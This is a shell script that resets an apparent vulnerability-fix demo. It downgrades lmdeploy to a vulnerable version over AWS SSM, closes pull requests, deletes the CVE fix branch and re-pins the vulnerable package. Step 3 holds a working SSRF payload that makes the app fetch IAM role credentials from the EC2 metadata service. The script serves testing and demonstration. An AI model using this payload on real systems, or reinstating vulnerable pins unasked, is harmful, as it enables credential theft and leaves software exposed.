#!/usr/bin/env bash
# Restore demo state after a dry run. Idempotent.
# Usage: scripts/reset-demo.sh
set -uo pipefail

: "${RUNWAYZERO_TEST_EC2_INSTANCE_ID:?must be set}"
: "${RUNWAYZERO_TEST_EC2_HOST:?must be set}"
: "${RUNWAYZERO_TEST_EC2_ROLE_NAME:?must be set}"
: "${CODECOMMIT_AWS_PROFILE:?must be set}"
: "${SSM_AWS_PROFILE:?must be set}"
: "${DEMO_APP_REPO:?must be set}"
: "${DEMO_APP_REPO_PATH:?must be set (local clone of the demo app repo)}"
REPO="$DEMO_APP_REPO"
FIX_BRANCH=runwayzero/cve-2026-33626
REGION="${AWS_REGION:-ap-southeast-1}"

echo "[reset] 1. Downgrade host to vulnerable lmdeploy 0.12.2 (offline, from cache)"
aws ssm send-command \
  --profile "$SSM_AWS_PROFILE" --region "$REGION" \
  --instance-ids "$RUNWAYZERO_TEST_EC2_INSTANCE_ID" \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["/opt/runwayzero/venv/bin/pip install --no-index --find-links /var/cache/runwayzero/wheels -r /opt/runwayzero/requirements.txt","systemctl restart runwayzero-demo"]' \
  --output text >/dev/null

echo "[reset] 2. Wait 30s for service to restart"
sleep 30

echo "[reset] 3. Confirm exploit works again (uses full IMDS path with role name)"
curl -s -X POST "http://${RUNWAYZERO_TEST_EC2_HOST}/chat" \
  -H "Content-Type: application/json" \
  -d "{\"image_url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/${RUNWAYZERO_TEST_EC2_ROLE_NAME}\"}" \
  | head -c 300
echo ""

echo "[reset] 4. Close any open RunwayZero PRs"
aws codecommit list-pull-requests --profile "$CODECOMMIT_AWS_PROFILE" --region "$REGION" \
  --repository-name "$REPO" --pull-request-status OPEN \
  --query "pullRequestIds" --output text 2>/dev/null \
| tr '\t' '\n' | while read -r pr; do
    [ -z "$pr" ] && continue
    echo "[reset]   closing PR $pr"
    aws codecommit update-pull-request-status --profile "$CODECOMMIT_AWS_PROFILE" --region "$REGION" \
      --pull-request-id "$pr" --pull-request-status CLOSED >/dev/null 2>&1 || true
  done

echo "[reset] 5. Delete fix branch (if exists)"
aws codecommit delete-branch --profile "$CODECOMMIT_AWS_PROFILE" --region "$REGION" \
  --repository-name "$REPO" --branch-name "$FIX_BRANCH" 2>/dev/null || true

echo "[reset] 6. Reset requirements.txt on eugene branch back to 0.12.2 (if drifted)"
cd "$DEMO_APP_REPO_PATH"
git fetch origin eugene
git checkout eugene
git pull origin eugene
REQ_FILE=platform/files/runwayzero/requirements.txt
if grep -q "lmdeploy==0.12.3" "$REQ_FILE" 2>/dev/null; then
  sed -i 's/lmdeploy==0.12.3/lmdeploy==0.12.2/' "$REQ_FILE"
  git add "$REQ_FILE"
  git commit -m "chore(rehearsal-reset): pin lmdeploy back to vulnerable 0.12.2"
  git push origin eugene
fi

echo "[reset] DONE — demo is in vulnerable starting state."
